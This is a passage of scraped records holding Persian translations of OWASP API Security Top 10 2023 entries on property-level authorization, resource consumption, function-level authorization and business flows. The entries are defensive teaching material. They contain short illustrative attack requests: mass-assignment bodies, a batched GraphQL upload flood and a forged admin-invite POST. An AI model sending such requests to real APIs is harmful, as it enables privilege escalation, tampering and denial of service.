Improper Restriction of Excessive Authentication Attempts][7]\n\n[1]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism(OTG-AUTHN-003)\n[3]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[4]: https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html\n[5]: https://owasp.org/www-community/attacks/Credential_stuffing\n[6]: https://cwe.mitre.org/data/definitions/204.html\n[7]: https://cwe.mitre.org/data/definitions/307.html\n", "timestamp": "2025-10-24T22:26:52.897275"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xa3-broken-object-property-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xa3-broken-object-property-level-authorization.md", "content": "# API3:2023 نقض مجوزدهی در سطح ویژگی‌های شیء\n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: متداول/ قابلیت تشخیص: آسان              | پیامد فنی: متوسط / خاص کسب و کار     |\n| APIها معمولاً اطلاعات تمام ویژگی‌های شیء درخواستی را به کاربر ارائه می‌دهند. این ویژگی در APIهای REST بسیار رایج است. در مقابل، در پروتکل‌های دیگر مانند GraphQL، شما می‌توانید درخواست‌های دقیق‌تری برای بازگشت ویژگی‌های خاص از یک شیء ارسال کنید. درنتیجه کنترل دقیق‌تری بر روی داده‌های دریافتی خواهید داشت. آگاهی از اینکه کدام ویژگی شیء، اضافی است دشوار است؛ زیرا ویژگی‌های اضافی ممکن است بسته به شرایط، تغییر کنند، اما ابزارهای خودکاری نیز وجود دارند که به تشخیص و مدیریت این ویژگی‌ها کمک می‌کنند. | بررسی پاسخ‌های API، روشی برای شناسایی اطلاعات حساس می‌باشد که از طریق این شناسایی می‌توان ویژگی‌های اضافی و پنهان را کشف کرد. از تکنیک‌هایی مانند فازینگ برای شناسایی ویژگی‌های اضافی استفاده می‌شود. اگر می‌خواهید بفهمید که آیا این ویژگی‌ها قابل تغییر هستند یا نه، باید درخواست‌های API خاصی را ارسال کرده و پس از تجزیه و تحلیل پاسخ‌های دریافتی درباره حساسیت اطلاعات موجود در آن، تصمیم بگیرید. در صورتی که ویژگی مورد نظر در پاسخ API نباشد، ممکن است نیاز به تحلیل اثرات جانبی داشته باشید تا بتوانید ویژگی مورد نظر را شناسایی و کنترل کنید.| دسترسی غیرمجاز به ویژگی‌های حساس یا خصوصی شیء، ممکن است منجر به افشا، از دست دادن یا خرابی داده شود. در شرایط خاص، دسترسی غیرمجاز به ویژگی‌های شیء می‌تواند به ارتقاء سطح دسترسی یا تصاحب جزئی/کامل حساب کاربری منجر شود.|\n\n## آیا API از نظر نقض مجوزدهی در سطح ویژگی‌های شیء ‌آسیب‌پذیر است؟\n\nهنگامی که از طریق یک endpoint به یک کاربر اجازه دسترسی به یک شیء می‌دهید، دقت کنید که کاربر تنها به ویژگی‌های مجاز دسترسی داشته باشد.  \nendpoint آسیب‌پذیر است اگر:\n\n1. ویژگی‌های حساس یک شیء را به کاربر غیرمجاز، افشا ‌کند (این مورد قبلاً با نام \"افشای مفرط داده\" نامگذاری شده بود).\n2. به کاربر اجازه ‌دهد که مقدار یک ویژگی حساس شیء را که کاربر نباید به آن دسترسی داشته باشد، تغییر داده، اضافه یا حذف کند (این مورد قبلاً با نام \"تخصیص جمعی\" نامگذاری شده بود).\n\n### مثال‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nیک برنامه دوستیابی به کاربر این امکان را می‌دهد که رفتار نامناسب دیگر کاربران را گزارش کند. در این فرآیند، کاربر روی دکمه \"گزارش\" کلیک کرده و API زیر را فراخوانی می‌کند:\n\n```\nPOST /graphql\n{\n  \"operationName\":\"reportUser\"\n  \"variables\":{\n    \"userId\": 313\n    \"reason\":[\"offensive behavior\"]\n  }\n  \"query\":\"mutation reportUser($userId: ID! $reason: String!) {\n    reportUser(userId: $userId reason: $reason) {\n      status\n      message\n      reportedUser {\n        id\n        fullName\n        recentLocation\n      }\n    }\n  }\"\n}\n```\n\n### سناریو #2\n\nیک پلتفرم اجاره اقامتگاه آنلاین را در نظر بگیرید که در آن به کاربران میزبان اجازه می‌دهد که آپارتمان خود را به کاربران مهمان اجاره دهند. میزبان می‌بایست پیش از اقدام به پرداخت مهمان، درخواست رزرو وی را تأیید کند.\n`\n```\n{\n  \"approved\": true\n  \"comment\": \"Check-in is after 3pm\"\n}\n```\n\nمیزبان می‌تواند درخواست معتبر را تکرار کرده و پیام‌های مخرب زیر را اضافه کند:\n`\n```\n{\n  \"approved\": true\n  \"comment\": \"Check-in is after 3pm\"\n  \"total_stay_price\": \"$1000000\"\n}\n```\n\n### سناریو #3\n\nیک شبکه اجتماعی که برای نمایش ویدیوهای کوتاه ساخته شده است، اقدام به اعمال فیلترینگ محتوا و سانسور محتوای کاربران می‌نماید. حتی اگر ویدیوی آپلود شده مسدود شود، کاربر می‌تواند توضیحات ویدیو را با استفاده از درخواست API زیر تغییر دهد:\n\n```\nPUT /api/video/update_video\n\n{\n  \"description\": \"a funny video about cats\"\n}\n```\n\nیک کاربر ناراضی می‌تواند درخواست معتبر را تکرار کرده و پیام‌های مخرب زیر را به درخواست اضافه کند:\n\n```\n{\n  \"description\": \"a funny video about cats\"\n  \"blocked\": false\n}\n```\n\n## چگونه از ‌آسیب‌پذیری نقض مجوزدهی در سطح ویژگی‌های شیء پیشگیری کنیم؟\n\n- هنگام ارائه یک شیء از طریق endpoint، همیشه اطمینان حاصل کنید که کاربر از قبل به ویژگی‌های ارائه شده، دسترسی داشته باشد.\n- اجتناب از استفاده از متدهای عمومی `to_json` و `to_string` و در عوض شناسایی کردن تک تک ویژگی‌ها و مشخصه‌هایی که برای پاسخ ضروری هستند.\n- در صورت امکان، از توابعی که به طور خودکار ورودی کاربر را به متغیرهای کد، اشیاء داخلی یا ویژگی‌های شیء متصل می‌کنند (\"تخصیص جمعی\") استفاده نکنید.\n- کاربر تنها بتواند ویژگی‌های مشخص و مجاز شیء را بروزرسانی کند.\n- بکارگیری یک مکانیزم اعتبارسنجی الگومحور برای بررسی اعتبار پاسخ‌ها بعنوان یک لایه امنیتی دیگر و همچنین تعریف و اعمال این مکانیزم بر روی داده بازگردانده شده تمامی APIها از جمله خطاها.\n- بر اساس نیازهای متد درخواستی، ساختارهای داده بازگردانده شده را در حداقل مقدار ممکن نگه دارید.\n\n## مراجع\n\n- [API3:2019 Excessive Data Exposure - OWASP API Security Top 10 2019][1]\n- [API6:2019 - Mass Assignment - OWASP API Security Top 10 2019][2]\n- [Mass Assignment Cheat Sheet][3]\n\n### خارجی\n\n- [CWE-213: Exposure of Sensitive Information Due to Incompatible Policies][4]\n- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][5]\n\n[1]: https://owasp.org/API-Security/editions/2019/en/0xa3-excessive-data-exposure/\n[2]: https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\n[4]: https://cwe.mitre.org/data/definitions/213.html\n[5]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:53.006444"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xa4-unrestricted-resource-consumption.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xa4-unrestricted-resource-consumption.md", "content": "# API4:2023 استفاده نامحدود از منابع\n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: متوسط |  میزان شیوع: گسترده/ قابلیت تشخیص: آسان              | پیامد فنی: شدید / خاص کسب و کار     |\n|بهره برداری از این آسیب‌پذیری نیاز به ارسال درخواست‌های ساده‌ای به سوی API دارد. کافی است تعدادی درخواست هم‌زمان از یک ماشین و یا با استفاده از منابع رایانش ابری به سوی API ارسال گردد تا بتوان از این آسیب‌پذیری بهره برد. اکثر ابزارهای خودکاری که موجود هستند، به منظور ایجاد حمله DoS از طریق بارگذاری حجم زیادی از ترافیک طراحی شده‌اند که این کار می‌تواند به سرویس‌دهی APIها آسیب رسانده و سرعت آن‌ها را کاهش دهد.|یافتن APIهایی که محدودسازی نرخ ارسال را بکار نگرفته یا محدودیت‌های اعمال شده آنها ناکافی است، کار دشواری نیست.  برای شناسایی این مشکل، مهاجمان می‌توانند درخواست‌های API را با پارامترهای خاصی طراحی کنند که تعداد منابعی را که API باز می‌گرداند، تغییر دهند. سپس با تجزیه و تحلیل وضعیت، زمان، و طول پاسخ‌های دریافتی، مشکل را شناسایی کنند. این موضوع برای عملیات‌های دسته‌ای هم صدق می‌کند. مهاجمان می‌توانند درخواست‌های دسته‌ای را با تغییر تعداد منابعی که در هر درخواست بازگشت داده می‌شوند، ارسال کرده و با ایجاد بارگذاری نامتعادل، اثرات منفی بر روی سرویس API ایجاد کنند. ممکن است مهاجمان اطلاعی از هزینه‌های اقتصادی حملات خود برای ارائه‌دهندگان خدمات نداشته باشند، اما می‌توانند با تحلیل مدل تجاری و قیمت‌گذاری خدمات، اثرات مالی این حملات را تخمین بزنند. |بهره برداری از این آسیب‌پذیری می‌تواند منجر به بروز DoS شده، در نتیجه API را از پاسخ به درخواست‌ها باز دارد و یا حتی آن را از دسترس خارج نماید. استفاده از این آسیب‌پذیری می‌تواند به دو شکل تأثیر منفی داشته باشد. اولاً، می‌تواند منجر به حمله DoS شده و منابع سیستم را اشغال کند. دوماً، به دلیل افزایش تقاضا بر روی واحدهای پردازشی، افزایش نیاز به فضای ذخیره‌سازی ابری و موارد مشابه می‌تواند منجر به افزایش هزینه‌های عملیاتی مرتبط با زیرساخت شود.|\n\n### آیا API از نظر مصرف بدون محدودیت منابع ‌‌آسیب‌پذیر است؟\n\nدرخواست‌‌های ارسال شده به سوی API منابعی از قبیل پهنای باند شبکه، پردازنده، حافظه و فضای ذخیره‌سازی را مصرف می‌کنند. برخی از منابع مورد نیاز برای اجرای درخواست‌های API از طریق دیگر ارائه‌دهندگان خدمات API فراهم می‌شوند. این منابع ممکن است شامل ارسال ایمیل، پیام متنی، تماس تلفنی یا اعتبارسنجی بیومتریک و موارد مشابه باشند.\nاگر دست‌کم یکی از محدودیت‌‌های زیر در سمت API به کلی اعمال نشده یا بطور نادرست (مثلا بیش از حد زیاد یا بیش از حد کم) ‌‌‌‌پیاده‌سازی شده باشد آنگاه API از منظر محدودیت یا کمبود نرخ ارسال، ‌‌آسیب‌پذیر خواهد بود:\n-\tTime Out اجرا \n-\tحداکثر میزان حافظه قابل تخصیص\n-\tحداکثر تعداد توصیف‌گر  فایل‌‌ها\n-\tحداکثر تعداد پردازه‌‌ها\n-\tحداکثر سایز بارگزاری فایل\n-\tتعداد فراخوانی‌هایی که یک کلاینت می‌تواند در یک درخواست واحد انجام دهد (مانند GraphQL batching)\n-\tتعداد رکوردهای بازگردانده شده در هر صفحه\n-\tحداکثر هزینه‌ای که ارائه‌دهندگان خدمات شخص ثالث می‌توانند از مشتریان دریافت کنند \n\n## مثال‌‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nیک شبکه اجتماعی بخش \"فراموشی رمز عبور\" را با استفاده از روش تأییدیه پیامکی پیاده‌سازی کرده است. کاربر پس از دریافت یک توکن یک‌بار مصرف از طریق پیامک، می‌تواند رمز عبور خود را بازنشانی کند. با کلیک بر روی گزینه \"فراموشی رمز عبور\"، API مرتبط از مرورگر کاربر به API Back-End ارسال می‌شود:\n\n```\nPOST /initiate_forgot_password\n\n{\n  \"step\": 1,\n  \"user_number\": \"6501113434\"\n}\n```\n\nدر پس‌زمینه، یک تماس API از سمت سرور به یک API از شخص ثالثی که وظیفه تحویل پیامک را دارد، ارسال می‌شود:\n\n```\nPOST /sms/send_reset_pass_code\n\nHost: willyo.net\n\n{\n  \"phone_number\": \"6501113434\"\n}\n```\nسرویس دهنده طرف ثالث با نام willyo ، برای هر تماس از این نوع، مبلغ ۰.۰۵ دلار هزینه می‌کند. مهاجم اسکریپتی می‌نویسد که اولین تماس API را ده‌ها هزار بار ارسال می‌کند. سپس بخش پشتیبانی از طریق درخواست از willyo می‌خواهد تا ده‌ها هزار پیام متنی ارسال کند که سبب می‌شود تا در عرض چند دقیقه هزاران دلار را از دست بدهد.\n\n### سناریو #2\n\nکاربر از طریق GraphQL API می‌تواند تصویر پروفایل خود را بارگذاری کند\n\n```\nPOST /graphql\n\n{\n  \"query\": \"mutation {\n    uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {\n      url\n    }\n  }\"\n}\n```\nبعد از اتمام عملیات بارگذاری تصویر توسط کاربر، API چندین تصویر کوچک با اندازه‌های مختلف از روی تصویر اصلی ایجاد می‌کند. این عملیات گرافیکی نیاز به حافظه زیادی از سرور دارد. API مذکور، از مکانیزم محدودیت نرخ سنتی استفاده می‌کند، به این معنا که یک کاربر نمی‌تواند در یک دوره زمانی کوتاه تعداد زیادی درخواست به تابع انتهایی GraphQL ارسال کند. همچنین، قبل از ایجاد تصاویر کوچک از تصویر بارگذاری شده، اندازه تصویر بارگذاری شده را بررسی می‌کند تا از پردازش تصاویری که بسیار بزرگ هستند جلوگیری کند. مهاجم می‌تواند با ارسال درخواست‌های مختلف و با حجم زیاد، از این مکانیزم‌ها عبور کرده و به تابع انتهایی GraphQL دسترسی پیدا کند:\n\n```\nPOST /graphql\n\n[\n  {\"query\": \"mutation {uploadPic(name: \\\"pic1\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  {\"query\": \"mutation {uploadPic(name: \\\"pic2\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n  ...\n  {\"query\": \"mutation {uploadPic(name: \\\"pic999\\\", base64_pic: \\\"R0FOIEFOR0xJVA…\\\") {url}}\"},\n}\n```\nبه علت عدم محدودیت در تعداد دفعات انجام عملیات uploadPic، این تماس منجر به اشغال حافظه سرور و وقوع DoD خواهد شد.\n\n### سناریو #3\n\nیک سرویس دهنده، به مشتریان اجازه می‌دهد که با استفاده از API آنها، فایل‌هایی با حجم دلخواه دانلود کنند. این فایل‌ها در فضای ابری ذخیره شده و اغلب تغییری نمی‌کنند. این سرویس دهنده برای بهبود نرخ ارائه خدمات و کاهش مصرف پهنای باند به یک سرویس حافظه‌پنهان مورد اعتماد نیاز دارد. این سرویس فقط فایل‌هایی را ذخیره می‌کند که حداکثر ۱۵ گیگابایت حجم دارند. اگر یکی از فایل‌ها بروزرسانی شده و اندازه آن به ۱۸ گیگابایت افزایش ‌یابد، همه مشتریان سرویس فورا نسخه جدید را دریافت می‌کنند. از آنجا که هیچ هشداری در مورد هزینه مصرفی وجود نداشته و مقدار حداکثری برای هزینه سرویس ابری تعیین نشده بود، صورت‌حساب ماهیانه بعدی از ۱۳ دلار به طور میانگین به ۸ هزار دلار افزایش می‌یابد.\n\n## چگونه از ‌‌آسیب‌پذیری مصرف بدون محدودیت منابع پیشگیری کنیم؟\n\n- محدودسازی [حافظه][1]، [پردازنده][2]، [تعداد دفعات راه اندازی مجدد][3]، [توصیف‌گرهای فایل][4] و پردازه‌‌ها با استفاده از کانتینرها یا کد بدون سرور (مانند Lambdas).\n- تعریف و اِعمال بیشینه اندازه داده (نظیر بیشینه طول برای رشته‌‌ها یا بیشینه تعداد عناصر در آرایه‌‌ها) در درخواست‌‌ها و محموله‌‌های ورودی.\n- اعمال محدودیت بر تعداد دفعات تعامل با API در یک دوره زمانی مشخص (محدودیت نرخ).\n- محدودیت نرخ باید بر اساس نیازهای کسب و کار بهبود یابد.\n- محدود کردن تعداد دفعات اجرای عملیات مربوط به یک API توسط یک مشتری/کاربر در زمان مشخص.\n- اجرای یک فرآیند اعتبارسنجی دقیق در طرف سرور برای پارامترهایی که به صورت متغیر در رشته‌های پرس‌وجو وجود دارند.\n- پیکربندی محدودیت‌ مقدار مصرف برای تمام سرویس دهندگان API. اگر تنظیم محدودیت‌ مقدار مصرف امکان‌پذیر نیست، به جای آن باید هشدارهای مالی پیکربندی شوند.\n\n## مراجع\n\n- [Web Service Security Cheat Sheet - OWASP][5]\n- [DoS Prevention - GraphQL Cheat Sheet][6]\n- [Mitigating Batching Attacks - GraphQL Cheat Sheet][7]\n\n### خارجی\n\n- [CWE-770: Allocation of Resources Without Limits or Throttling][8]\n- [CWE-400: Uncontrolled Resource Consumption][9]\n- [CWE-799: Improper Control of Interaction Frequency][10]\n-\t“Rate Limiting (Throttling)” - [Security Strategies for Microservices-based Application Systems][11], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#ulimit\n[5]: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#availability\n[6]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#dos-prevention\n[7]: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#mitigating-batching-attacks\n[8]: https://cwe.mitre.org/data/definitions/770.html\n[9]: https://cwe.mitre.org/data/definitions/400.html\n[10]: https://cwe.mitre.org/data/definitions/799.html\n[11]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204.pdf\n", "timestamp": "2025-10-24T22:26:53.121256"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xa5-broken-function-level-authorization.md", "content": "# API5:2023 نقض مجوزدهی در سطح توابع\n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: متداول/ قابلیت تشخیص: آسان              | پیامد فنی: شدید / خاص کسب و کار     |\n| بهره برداری از این ‌‌آسیب‌پذیری یعنی ارسال فراخوانی‌های API درست[^1]  توسط مهاجم به سوی تابع انتهاییAPI  در ارتباط با فراخوانی‌هایی که مهاجم مجوز آنها را ندارد. این Endpointها ممکن است در معرض دید کاربران ناشناس، بدون مجوز یا با مجوز عادی قرار داشته باشند. برای مهاجم تشخیص وجود چنین نواقصی در API آسان تر است چرا که ساختارمندتر بوده و نحوه دسترسی آنها به توابع، قابل پیش بینی تر است (مثلا تغییر متد HTTP از GET به PUT یا تغییر رشته “users” در URL به “admins”).      | کنترل‌های مجوزدهی برای توابع یا منابع غالبا در سطح پیکربندی یا کد مدیریت می شوند. بکارگیری کنترل‌های مناسب می‌تواند گیج کننده باشد چرا که اپلیکیشن‌های مدرن امروزی غالبا دارای انواع مختلفی از نقش‌ها و گروه‌ها و سلسله مراتب کاربری هستند (مثلا کاربران دارای بیش از یک نقش). کشف نقائص در API ها به علت ساختار سازمان‌مندتر و همچنین پیش‌بینی‌پذیری بالاتر در دسترسی به توابع مختلف، نسبت به سایر بخش‌های نرم‌افزاری، ساده‌تر است.         | چنین مشکلاتی منجر به دسترسی غیرمجاز مهاجم به توابع می‌شود. در این صورت توابع مدیریتی[^2]  از جمله اهداف کلیدی مهاجم خواهند بود و ممکن است منجر به افشا، از دست رفتن یا خرابی داده شده و اختلال در خدمات را به دنبال داشته باشد.         |\n\n## آیا API از نظر نقض مجوزدهی در سطح توابع ‌‌آسیب‌پذیر است؟\n\nبهترین راه یافتن مشکلات مجوزدهی در سطح توابع، تحلیل عمیق مکانیزم مجوزدهی با لحاظ کردن سلسله مراتب کاربران، نقش‌‌‌ها و گروه‌‌‌های متفاوت موجود در اپلیکیشن و پرسیدن پرسش‌‌‌های زیر است:\n-\tآیا کاربر عادی می‌تواند به توابع و نقاط مدیریتی در API دسترسی داشته باشد؟\n-\tآیا کاربری می‌تواند عمل حساسی که مجوز انجام آن را ندارد (نظیر ایجاد، تغییر یا حذف) را صرفا با تغییر متد HTTP (مثلا از GET به DELETE) انجام دهد؟\n-\tآیا کاربری از گروه X می‌تواند صرفا با حدس زدن URLهای توابع و پارامترهای آن به مسیری (نظیر /api/v1/users/export_all) که فقط باید برای کاربران گروه Y قابل مشاهده باشد دسترسی یابد؟\nبایستی در نظر داشت که عادی یا مدیریتی بودن یک تابع در API (همان API Endpoint) صرفا بر مبنای مسیر URL تعیین نمی‌شود.\nدر حالیکه توسعه دهندگان بیشتر تمایل دارند که توابع مدیریتی را ذیل یک مسیر نسبی  معین مانند api/admin قرار دهند، اما بسیار دیده می شود که این توابع مدیریتی در کنار توابع عادی در مسیرهایی نظیر api/users قرار داده شده‌اند.\n\n## مثال‌‌‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nدر خلال فرایند ثبت نام در یک اپلیکیشن که فقط به کاربران دعوت شده اجازه عضویت می‌دهد، اپلیکیشن موبایل، یک فراخوانی API به `GET /api/invites/{invite_guid}` می‌فرستد. پاسخ دریافتی فایل JSONی را دارا است که درون آن اطلاعات دعوتنامه‌‌‌ها شامل نقش کاربر و آدرس ایمیل وی دیده می‌شود.\n\nمهاجم درخواست مذبور را ضبط کرده و متد HTTP را به `POST /api/invites/new` تغییر می‌دهد. این تابع تنها بایستی از طریق کنسول مدیریت و برای ادمین‌‌‌ها قابل دسترسی باشد که بعلت عدم بکارگیری کنترل‌‌‌های صحیح مجوزدهی درسطح توابع اینگونه نیست.\n\nدر گام بعد مهاجم از این مساله بهره برداری کرده و برای خود دعوتنامه‌ای جهت ساخت یک اکانت ادمین می‌فرستد:\n\n```http\nPOST /api/invites/new\n{“email”:”hugo@malicious.com””role”:”admin”}\n```\n\n### سناریو #2\n\nیک API دارای تابعی است که فقط ادمین‌‌‌ها بایستی آن را ببینند:\n`GET /api/admin/v1/users/all`\nاین تابع در پاسخ جزئیات تمامی کاربران اپلیکیشن را برگردانده و کنترل‌‌‌های مجوزدهی در سطح توابع را نیز به درستی ‌‌‌‌پیاده‌سازی نکرده است. مهاجمی که با ساختار API آشنایی پیدا کرده، این مسیر را حدس زده و اطلاعات حساس تمامی کاربران اپلیکیشن را می‌رباید.\n\n## چگونه از ‌‌آسیب‌پذیری نقض مجوزدهی در سطح توابع پیشگیری کنیم؟\n\nماژول مجوزدهی اپلیکیشن بایستی بطور یکپارچه توسط تمامی توابع اپلیکیشن فراخوانی شده و تحلیل آن نیز آسان باشد. همچنین در بیشتر مواقع، این روش حفاطتی توسط یک یا چند مولفه بیرونی و خارج از کد اصلی اپلیکیشن فراهم می‌شود.\n\n- مکانیزم (های) اعمال شده بایستی بطور پیشفرض کلیه دسترسی‌‌‌ها را Deny (رد) نموده و برای دسترسی به هر یک از توابع، مجوزخاص دسترسی نقش مربوطه را طلب نمایند.\n- توابع API از منظر نواقص مجوزدهی در سطح تابع با درنظر گرفتن منطق اپلیکیشن و سلسله مراتب گروه‌‌‌های کاربری مورد بازبینی قرار گیرد.\n- تمامی کنترلگرهای مدیریتی از یک کنترلگر مدیریتی انتزاعی که مجوزها را بر حسب نقش کاربر یا گروه پیاده‌سازی نموده، ارث بری داشته باشند.\n- تمامی توابع مدیریتی درون یک کنترلگر عادی (غیرمدیریتی)، کنترل‌‌‌های مجوز مبتنی بر نقش کاربر یا گروه را بکارگیرند.\n- حصول اطمینان از این که تمام کنترل‌گرهای مدیریتی از یک کنترل‌گر انتزاعی مدیریتی به ارث برده‌ شدند که بر اساس گروه/نقش کاربری عملیات احراز هویت را انجام می‌دهد.\n- حصول اطمینان از این که عملیات مدیریتی در داخل یک کنترل‌گر معمولی پس از بررسی‌های احراز هویت بر اساس گروه و نقش کاربر و بر اساس منطق کسب و کار پیاده‌سازی می‌شوند.\n\n## مراجع\n- [Forced Browsing][1]\n- \"A7: Missing Function Level Access Control\", [OWASP Top 10 2013][2]\n- [Access Control][3]\n\n### خارجی\n\n- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)\n\n[1]: https://owasp.org/www-community/attacks/Forced_browsing\n[2]: https://github.com/OWASP/Top10/raw/master/2013/OWASP%20Top%2010%20-%202013.pdf\n[3]: https://owasp.org/www-community/Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:53.231296"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2023/fa/0xa6-unrestricted-access-to-sensitive-business-flows.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2023/fa/0xa6-unrestricted-access-to-sensitive-business-flows.md", "content": "# API6:2023 دسترسی نامحدود به جریان‌های حساس کسب و کار\n\n| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |\n|---------|--------------------|------------|\n| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: گسترده/ قابلیت تشخیص: متوسط              | پیامد فنی: متوسط / خاص کسب و کار     |\n| بهره برداری از این آسیب‌پذیری غالبا نیاز به فهم منطق کسب و کار، روابط مابین اشیا و ساختار API از سوی مهاجم دارد.               | نداشتن یک دیدگاه کلی از API برای پشتیبانی کامل از نیازهای کسب و کار به تکرار این مشکلات منجر می‌شود. مهاجمان به صورت دستی منابع هدف(مثلاً نقاط پایان) و چگونگی کارکرد آنها را مشخص می‌کنند. اگر مکانیزم‌های مخصوص جلوگیری از حملات (تعداد دسترسی محدود به API، محدودیت نرخ و غیره) از قبل وجود داشته باشند، مهاجمان باید راهی برای دور زدن آنها پیدا کنند.     | بطور کلی بهره‌برداری از این آسیب‌پذیری نباید تأثیرات فنی  داشته باشد. اما مواردی مانند عدم امکان خرید محصول توسط کاربران معتبر یا ایجاد تورم در اقتصاد داخلی نیز ممکن است پیامد این آسیب‌پذیری باشند.         |\n\n## آیا API از نظر دسترسی بدون محدودیت به جریان‌های کسب‌وکار حساس ‌‌‌آسیب‌پذیر است؟\n\nدر زمان ایجاد یک API Endpoint، باید مشخص شود چه جریان کاری‌ای افشا می‌شود. برخی از جریان‌های کاری نسبت به دیگران حساس‌تر هستند، به معنای اینکه دسترسی به آنها بیش از حد مجاز ممکن است به کسب و کار آسیب بزند.\n\nنمونه‌‌‌هایی از «ویژگی‌‌‌های حساس» عبارتند از:\n\n- جریان خرید محصول - مهاجم می‌تواند به یک‌باره تمام موجودی یک محصول با تقاضای بالا را خریداری کرده و سپس آن محصول را با قیمت بالاتری مجدداً بفروشد (scalping).\n- جریان ایجاد نظر یا پست - مهاجم ممکن است سیستم را با ارسال نظرات یا پست‌های مکرر دچار مشکل کند.\n- جریان رزرو کردن - مهاجم می‌تواند تمام بازه‌های زمانی موجود را رزرو کرده و مانع استفاده دیگر کاربران شود.\n\nخطر دسترسی بیش از حد، بین صنایع و کسب و کارهای مختلف متغیر است. به عنوان مثال، ایجاد پست‌ توسط یک اسکریپت ممکن است در یک شبکه اجتماعی به عنوان خطر اسپم در نظر گرفته شود، اما درشبکه اجتماعی دیگر تشویق شود.  \nاگر یک تابع انتهایی API امکان دسترسی بیش از حد به یک جریان کسب و کار حساس را فراهم ‌کند، در معرض حملات و سوءاستفاده‌ مهاجمان خواهد بود.\n\n## مثال‌‌‌هایی از سناریوهای حمله\n\n### سناریو #1\n\nیک شرکت فناوری اعلام می‌کند که قصد دارد یک کنسول بازی جدید را در روز شکرگزاری منتشر کند. این محصول تقاضای بسیار بالا و موجودی محدودی دارد. مهاجم کدی می‌نویسد تا به صورت خودکار محصول جدید را بخرد.  \nدر روز انتشار، مهاجم کد را از طریق آدرس IPها و مکان‌های مختلف اجرا می‌کند. تابع انتهایی API  اقدامات حفاظتی مناسبی را پیاده‌سازی نکرده و درنتیجه به مهاجم این امکان را می‌دهد که بیشترین تعداد ممکن از موجودی را قبل از سایر کاربران معتبر بخرد.\n\n### سناریو #2\n\nیک شرکت هواپیمایی خدمات مربوط به خرید بلیط آنلاین را بدون هیچ گونه هزینه‌ی لغو خرید، به کاربران ارائه می‌دهد. یک کاربر، 90٪ از صندلی‌های پرواز مورد نظر را رزرو می‌کند.  \nچند روز پیش از پرواز، کاربر مذکور، همه بلیط‌ها را یک‌جا لغو می‌کند، که باعث می‌شود شرکت هواپیمایی برای پر کردن پرواز، مجبور شود بلیط‌ها را با تخفیف بفروشد. در این حالت، کاربر می‌تواند یک بلیط به قیمت بسیار ارزان‌تر از بلیط اصلی بخرد.\n\n### سناریو #3\n\nیک اپلیکیشن سفر اشتراکی برنامه‌ای برای معرفی دوستان دارد. کاربران می‌توانند دوستان خود را دعوت کرده و برای هر دوستی که به اپلیکیشن بپیوندد، اعتبار دریافت کنند. این اعتبار بعداً می‌تواند به عنوان وجه نقد برای رزرو سفرها استفاده شود. مهاجم با نوشتن یک اسکریپت فرآیند ثبت‌نام را به صورت خودکار انجام می‌دهد و با هر فرآیند ثبت‌نام کاربر جدید، اعتباری به کیف پولش اضافه می‌شود. مهاجم بعداً می‌تواند از سفرهای رایگان بهره‌برداری کرده یا حساب‌هایی با اعتبارهای اضافی را  در ازای پول نقد بفروشد.\n\n## چگونه از ‌‌‌آسیب‌پذیری دسترسی بدون محدودیت به جریان‌های کسب‌وکار حساس پیشگیری کنیم؟\n\nبرنامه‌ریزی برای کاهش تهدیدات در دو لایه باید انجام شود:\n\n- در لایه کسب و کار، باید جریان‌های کسب و کار حساسی را شناسایی کنیم که اگر به صورت نرم‌افرازی استفاده شوند، ممکن است به کسب‌وکار آسیب بزنند.\n- در لایه مهندسی، مکانیزم‌های حفاظتی مناسبی را برای کاهش خطرهای لایه کسب و کار انتخاب می‌کنیم.\n\nدر این قسمت به 